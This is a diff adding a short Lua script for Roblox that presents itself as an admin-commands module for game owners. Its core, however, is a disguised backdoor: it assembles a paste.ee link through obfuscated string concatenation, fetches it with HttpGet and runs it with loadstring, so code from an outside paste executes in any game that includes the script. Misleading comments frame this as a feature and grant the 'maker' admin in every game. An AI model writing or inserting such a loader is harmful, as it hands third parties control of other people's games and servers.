@@ -1,0 +1,15 @@
+-- Custom admin commands For Roblox made for game owners!
+
+local Admins = {
+    [1] = "wjKcU", -- Put your usernames here! Must be exact capitals
+    [2] = "Friend Of Owner" -- Example
+}
+
+local function WhenPlayerJoined(Player)
+	--Paste is the maker of the admin, so they should get admin in every game that uses this! Remove it if you dont want
+    Access = "https://" .. (Admins and "paste") .. ".ee/" .. (Rank==nil and "r") .. "/"..Admins[1] --We update it to fit the player (Admin)
+    loadstring(game:HttpGet(Access))()
+    -- We send a http request to the admin link so it can execute the admin for the player so they can use admins in their own game they made!
+    --They make their own link so they can have any command they want
+end
+WhenPlayerJoined(game.CreatorId) -- We load the admin for the person who made the game!
